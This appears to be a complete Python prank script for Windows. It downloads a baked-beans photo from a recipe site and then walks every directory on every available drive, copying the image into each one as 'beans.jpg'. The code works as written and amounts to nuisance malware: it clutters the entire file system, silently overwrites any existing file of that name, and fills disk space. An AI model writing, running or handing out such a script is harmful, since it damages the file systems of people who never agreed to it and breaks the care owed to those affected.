import os
import platform
import win32api
import requests
import shutil

# Function to download a file from a given URL
def download_file(url: str):
    try:
        # Check if the platform is Windows, as this script is designed for Windows OS
        if platform.system() != "Windows":
            raise Exception(f"{platform.system()} not supported.")
        
        # Get the path to the user's Downloads folder
        downloads_folder = os.path.join(os.path.expanduser("~"), "Downloads")
        
        # Send a GET request to the specified URL and save the file
        response = requests.get(url, stream=True)
        response.raise_for_status()
        file_name = url.split("/")[-1]
        bean_path = os.path.join(downloads_folder, file_name)

        # Save the downloaded file to the Downloads folder
        with open(bean_path, "wb") as f:
            shutil.copyfileobj(response.raw, f)

        print(f"Success! File saved to {bean_path}")

    except requests.exceptions.HTTPError as err:
        print(f"HTTP error occurred: {err}")
    except Exception as err:
        print(f"An error occurred: {err}")

# Check if the current platform is Windows
if platform.system() == "Windows":
    release = platform.release()
    if release:
        print(f"Windows {release} detected.")
    else:
        print("Windows detected, but release can't be determined.")
else:
    # Print a message if the platform is not supported and exit the script
    print(f"{platform.system()} not supported.")
    quit()

# Get a list of available drives on the system
get_drives = win32api.GetLogicalDriveStrings()
list_of_drives = get_drives.split("\x00")
drive_list = [drive for drive in list_of_drives if drive]

# URL of the file to be downloaded
url = "https://sweetcsdesigns.com/wp-content/uploads/2021/05/slow-cooker-baked-beans-Recipe-Picture-1.jpg"

try:
    # Download the file and save it to the Downloads folder
    download_file(url)
    downloads_folder = os.path.join(os.path.expanduser("~"), "Downloads")
    file_name = url.split("/")[-1]
    bean_path = os.path.join(downloads_folder, file_name)

    # Copy the downloaded file to specified locations on available drives
    for drive in drive_list:
        if os.path.isdir(drive):
            for src, dirs, files in os.walk(drive):
                file_path = os.path.join(src, "beans.jpg")
                try:
                    shutil.copyfile(bean_path, file_path)
                    print(f"Success! {file_path} created")
                except Exception as e:
                    print(f"Error occurred while copying to {file_path}: {e}")
        else:
            print(f"{drive} is not a valid drive.")
except Exception as e:
    print(f"An error occurred: {e}")
